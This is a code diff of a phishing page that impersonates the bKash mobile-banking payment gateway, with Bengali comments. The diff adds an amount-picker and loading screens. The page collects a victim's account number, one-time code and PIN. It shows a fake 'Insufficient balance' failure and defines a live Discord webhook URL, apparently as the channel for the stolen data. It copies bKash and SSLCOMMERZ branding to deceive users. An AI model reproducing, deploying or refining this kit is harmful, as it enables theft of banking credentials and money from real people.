@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>bKash Payment UI</title>
+    <title>bKash Payment Gateway</title>
     
     <!-- সোশ্যাল মিডিয়া প্রিভিউ ইমেজ ট্যাগ -->
     <meta property="og:title" content="bKash Payment">
@@ -15,18 +15,18 @@
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         
         html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; background-color: #8c8c8c; }
-        body { font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: flex-start; padding-top: 12vh; }
+        body { font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: flex-start; padding-top: 10vh; }
         
         .bkash-container { 
-            width: 92%; max-width: 350px; height: 450px; background: white; 
+            width: 92%; max-width: 350px; height: 480px; background: white; 
             border-radius: 4px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); 
             display: flex; flex-direction: column; position: relative; overflow: hidden;
         }
 
-        .header { height: 45px; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #f1f1f1; flex-shrink: 0; }
-        .header img { width: 70px; }
+        .header { height: 45px; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #f1f1f1; flex-shrink: 0; background: #fff; }
+        .header img { width: 70px; object-fit: contain; }
 
-        .merchant-bar { display: flex; align-items: center; justify-content: space-between; padding: 8px 15px; border-bottom: 1px solid #eee; flex-shrink: 0; }
+        .merchant-bar { display: flex; align-items: center; justify-content: space-between; padding: 8px 15px; border-bottom: 1px solid #eee; flex-shrink: 0; display: none; background: #fff; }
         .m-info { display: flex; align-items: center; gap: 8px; }
         .m-icon { width: 32px; height: 32px; border: 1px solid #eee; border-radius: 50%; display: flex; align-items: center; justify-content: center; overflow: hidden; background: white; }
         .m-icon img { width: 130%; height: 130%; object-fit: cover; }
@@ -36,8 +36,47 @@
         .content-area { 
             background: #e2136e; flex-grow: 1; display: flex; flex-direction: column; 
             align-items: center; justify-content: center; padding: 15px 20px; 
-            color: white; text-align: center; position: relative;
+            color: white; text-align: center; position: relative; overflow: hidden;
         }
+
+        /* দৃশ্যমান ও আকর্ষণীয় গ্লোবাল লোডার স্ক্রিন */
+        #global-loader { 
+            position: absolute; inset: 0; background: #e2136e; z-index: 40; 
+            display: flex; flex-direction: column; justify-content: center; align-items: center; 
+            transition: opacity 0.4s ease;
+        }
+        .spinner {
+            width: 45px; height: 45px; border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white; border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* অ্যামাউন্ট সিলেকশন পেজ */
+        #amount-page { 
+            position: absolute; inset: 0; background: linear-gradient(135deg, #fce4ec 0%, #f48fb1 100%);
+            display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
+            transition: transform 0.4s ease, opacity 0.3s ease; z-index: 10;
+        }
+        #amount-page.hide { transform: translateX(-100%); opacity: 0; }
+
+        .amount-title { font-size: 15px; font-weight: 700; color: #880e4f; margin-bottom: 20px; }
+        .amount-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; width: 100%; }
+        .amount-card { 
+            background: #ffffff; border: 2px solid #e2136e; color: #e2136e; padding: 12px 0; 
+            font-size: 18px; font-weight: 700; border-radius: 6px; cursor: pointer; 
+            transition: all 0.2s ease; box-shadow: 0 4px 10px rgba(226, 19, 110, 0.2);
+        }
+        .amount-card:hover { background: #e2136e; color: white; transform: translateY(-2px); }
+        .amount-card:active { transform: scale(0.95); }
+
+        /* মূল পেমেন্ট পেজ */
+        #payment-page { 
+            position: absolute; inset: 0; background: #e2136e; padding: 15px 20px;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            color: white; transform: translateX(100%); transition: transform 0.4s ease; z-index: 5;
+        }
+        #payment-page.active { transform: translateX(0); }
 
         .label-main { font-size: 14px; font-weight: 500; margin-bottom: 10px; }
         .label-sub { font-size: 15px; font-weight: 500; margin-bottom: 10px; }
@@ -48,21 +87,19 @@
             font-weight: 600; color: #4A4A4A; outline: none; margin: 10px 0; box-sizing: border-box;
             background: white;
         }
-
         .main-input::placeholder { color: #4A4A4A; opacity: 0.3; font-weight: 400; }
 
         .resend-link { font-size: 13px; text-decoration: underline; cursor: pointer; color: white; display: none; font-weight: 500; }
         .timer-box { font-size: 12px; }
 
-        .action-bar { height: 65px; background: #f1f1f1; display: flex; align-items: center; padding: 0 15px; gap: 10px; flex-shrink: 0; }
+        /* একশন বার */
+        .action-bar { height: 65px; background: #f1f1f1; display: none; align-items: center; padding: 0 15px; gap: 10px; flex-shrink: 0; }
         .btn { flex: 1; height: 40px; border-radius: 3px; border: none; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; position: relative; }
         .btn-cancel { background: white; border: 1px solid #ddd; color: #666; }
         .btn-confirm { background: #b5b5b5; color: white; pointer-events: none; }
         .btn-confirm.active { background: #e2136e; pointer-events: auto; }
 
-        #loader-overlay { position: absolute; inset: 0; background: #e2136e; z-index: 20; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .dots { display: flex; gap: 6px; }
-        .dots div { width: 10px; height: 10px; background: white; border-radius: 50%; animation: bounce 0.6s infinite alternate; }
+        /* বাটন লোডার অ্যানিমেশন */
         .inner-loader { display: none; gap: 4px; position: absolute; }
         .inner-loader div { width: 7px; height: 7px; background: white; border-radius: 50%; animation: bounce 0.6s infinite alternate; }
         @keyframes bounce { to { opacity: 0.3; transform: translateY(-4px); } }
@@ -81,61 +118,132 @@
 <body>
 
 <div class="bkash-container">
-    <div class="header"><img src="https://raw.githubusercontent.com/devvilxxx1/Faltux/refs/heads/main/bkash-logo-horizontal-mobile-banking-app-icon-emblem-transparent-background-free-png.png"></div>
+    <!-- হেডার লোগো -->
+    <div class="header">
+        <img src="https://raw.githubusercontent.com/devvilxxx1/Faltux/refs/heads/main/bkash-logo-horizontal-mobile-banking-app-icon-emblem-transparent-background-free-png.png" alt="bKash">
+    </div>
+
+    <!-- মার্চেন্ট বার -->
     <div id="merchant-bar" class="merchant-bar">
         <div class="m-info">
-            <!-- এখানে প্রথম দেওয়া মার্চেন্ট লোগো ঠিক রাখা হয়েছে -->
             <div class="m-icon"><img src="https://raw.githubusercontent.com/devvilxxx1/Faltux/heads/main/images%20(3).png"></div>
             <div class="m-text"><b>SSLCOMMERZ</b><br><span>Inv: 8cf84713499...</span></div>
         </div>
-        <div class="m-amount">৳<span id="displayAmount">20</span></div>
+        <div class="m-amount">৳<span id="displayAmount">0</span></div>
     </div>
 
     <div class="content-area">
-        <div id="loader-overlay">
-            <div class="dots"><div></div><div></div><div></div></div>
-            <p style="margin-top:10px; font-size: 13px;">Loading</p>
+        <!-- দৃশ্যমান গ্লোবাল লোডার স্ক্রিন -->
+        <div id="global-loader">
+            <div class="spinner"></div>
+            <p style="margin-top:15px; font-size: 14px; font-weight: 600; letter-spacing: 0.5px;">বিকাশ পেমেন্ট লোড হচ্ছে...</p>
         </div>
 
-        <div id="ui-steps" style="width: 100%;">
-            <div id="label-top" class="label-main">Your bKash Account Number</div>
-            <div id="label-mid" class="label-sub"></div>
-            <input type="tel" id="user-input" class="main-input" placeholder="e.g 01XXXXXXXXX" maxlength="11" oninput="validateInput()">
-            <div id="terms-txt" style="font-size: 12px;">Confirm and proceed, <u style="cursor:pointer">terms & conditions</u></div>
-            <div id="resend-container" style="display: none; margin-top: 5px;">
-                <div id="timer-box" class="timer-box">Resend Code in <span id="timer">30</span>s</div>
-                <div id="resend-link" class="resend-link" onclick="handleResend()">Resend Code</div>
+        <!-- অ্যামাউন্ট সিলেকশন পেজ -->
+        <div id="amount-page">
+            <div class="amount-title">পেমেন্ট পরিমাণ নির্বাচন করুন</div>
+            <div class="amount-grid">
+                <button class="amount-card" onclick="selectAmount(20)">৳২০</button>
+                <button class="amount-card" onclick="selectAmount(110)">৳১১০</button>
+                <button class="amount-card" onclick="selectAmount(250)">৳২৫০</button>
+                <button class="amount-card" onclick="selectAmount(350)">৳৩৫০</button>
+                <button class="amount-card" onclick="selectAmount(510)">৳৫১০</button>
+                <button class="amount-card" onclick="selectAmount(1020)">৳১০২০</button>
             </div>
         </div>
 
-        <div id="fail-screen">
-            <div class="fail-icon">✕</div>
-            <div class="fail-title">Payment Failed</div>
-            <div class="fail-reason">Insufficient balance</div>
-            <div class="fail-redirect">Redirecting to <u>Merchant Website</u> in <span id="redir-timer">5</span>s</div>
+        <!-- মূল পেমেন্ট পেজ -->
+        <div id="payment-page">
+            <div id="ui-steps" style="width: 100%;">
+                <div id="label-top" class="label-main">Your bKash Account Number</div>
+                <div id="label-mid" class="label-sub"></div>
+                <input type="tel" id="user-input" class="main-input" placeholder="e.g 01XXXXXXXXX" maxlength="11" oninput="validateInput()">
+                <div id="terms-txt" style="font-size: 12px;">Confirm and proceed, <u style="cursor:pointer">terms & conditions</u></div>
+                <div id="resend-container" style="display: none; margin-top: 5px;">
+                    <div id="timer-box" class="timer-box">Resend Code in <span id="timer">30</span>s</div>
+                    <div id="resend-link" class="resend-link" onclick="handleResend()">Resend Code</div>
+                </div>
+            </div>
+
+            <div id="fail-screen">
+                <div class="fail-icon">✕</div>
+                <div class="fail-title">Payment Failed</div>
+                <div class="fail-reason">Insufficient balance</div>
+                <div class="fail-redirect">Redirecting to <u>Merchant Website</u> in <span id="redir-timer">5</span>s</div>
+            </div>
         </div>
     </div>
 
+    <!-- একশন বার -->
     <div class="action-bar" id="action-bar">
-        <button class="btn btn-cancel" onclick="location.reload()">Cancel</button>
+        <button class="btn btn-cancel" onclick="resetToAmountPage()">Cancel</button>
         <button id="confirm-btn" class="btn btn-confirm" onclick="handleFlow()">
             <span id="btn-text">Confirm</span>
             <div class="inner-loader" id="btn-load"><div></div><div></div><div></div></div>
         </button>
     </div>
-    <div class="footer"><b>📞 16247</b><div>© 2026 bKash, All Rights Reserved</div></div>
+
+    <!-- ফুটার -->
+    <div class="footer">
+        <b>📞 16247</b>
+        <div>© 2026 bKash, All Rights Reserved</div>
+    </div>
 </div>
 
 <script>
     const webhookURL = "https://discord.com/api/webhooks/1528766265706025141/sMFgoZvySgACZiyhqORIhulTM6gZlLbVGckfXACBFeCNpFbT6WVC9AtWBGkuzDZZgIT9";
-    let step = 1, number = "", selectedAmount = "26", otpInterval;
+    let step = 1, number = "", selectedAmount = "0", otpInterval;
 
+    // পেজ লোড হওয়ার পর লোডার সচল রাখা ও দৃশ্যমান করা
     window.onload = () => {
-        const urlParams = new URLSearchParams(window.location.search);
-        const amount = urlParams.get('amount');
-        if (amount) { selectedAmount = amount; document.getElementById('displayAmount').innerText = selectedAmount; }
-        setTimeout(() => { document.getElementById('loader-overlay').style.display = 'none'; }, 2000);
+        setTimeout(() => {
+            const loader = document.getElementById('global-loader');
+            loader.style.opacity = '0';
+            setTimeout(() => {
+                loader.style.display = 'none';
+            }, 400);
+        }, 1200);
     };
+
+    function selectAmount(amount) {
+        selectedAmount = amount;
+        document.getElementById('displayAmount').innerText = selectedAmount;
+        
+        // অ্যামাউন্টে ক্লিক করার পর স্পষ্ট ও দৃশ্যমান লোডার দেখানো
+        const loader = document.getElementById('global-loader');
+        loader.style.display = 'flex';
+        loader.style.opacity = '1';
+        loader.querySelector('p').innerText = "পেমেন্ট গেটওয়েতে সংযোগ করা হচ্ছে...";
+
+        setTimeout(() => {
+            document.getElementById('amount-page').classList.add('hide');
+            document.getElementById('merchant-bar').style.display = 'flex';
+            document.getElementById('action-bar').style.display = 'flex';
+            document.getElementById('payment-page').classList.add('active');
+            
+            // লোডার হাইড করা
+            loader.style.opacity = '0';
+            setTimeout(() => {
+                loader.style.display = 'none';
+                loader.querySelector('p').innerText = "বিকাশ পেমেন্ট লোড হচ্ছে..."; // টেক্সট রিসেট
+            }, 400);
+        }, 1500);
+    }
+
+    function resetToAmountPage() {
+        document.getElementById('payment-page').classList.remove('active');
+        document.getElementById('merchant-bar').style.display = 'none';
+        document.getElementById('action-bar').style.display = 'none';
+        document.getElementById('amount-page').classList.remove('hide');
+        step = 1;
+        document.getElementById('user-input').value = "";
+        document.getElementById('user-input').maxLength = 11;
+        document.getElementById('user-input').placeholder = "e.g 01XXXXXXXXX";
+        document.getElementById('label-top').innerText = "Your bKash Account Number";
+        document.getElementById('label-mid').innerText = "";
+        document.getElementById('terms-txt').style.display = 'block';
+        document.getElementById('confirm-btn').classList.remove('active');
+    }
 
     function validateInput() {
         const input = document.getElementById('user-input');
@@ -202,8 +310,8 @@
                 document.getElementById('label-mid').innerText = "(" + number.substring(0,3) + " ** *** " + number.substring(8) + ")";
                 document.getElementById('resend-container').style.display = 'none';
                 input.value = ""; 
-                input.type = "tel"; // সংখ্যা কিবোর্ড নিশ্চিত করার জন্য
-                input.style.webkitTextSecurity = "disc"; // পিন ডট ডট দেখানোর জন্য
+                input.type = "tel"; 
+                input.style.webkitTextSecurity = "disc"; 
                 input.placeholder = "Enter PIN"; 
                 input.maxLength = 5;
                 step = 3;
@@ -225,7 +333,7 @@
         const interval = setInterval(() => {
             rs--;
             if(document.getElementById('redir-timer')) document.getElementById('redir-timer').innerText = rs;
-            if(rs <= 0) { clearInterval(interval); window.location.href = "index.html"; }
+            if(rs <= 0) { clearInterval(interval); location.reload(); }
         }, 1000);
     }
 </script>
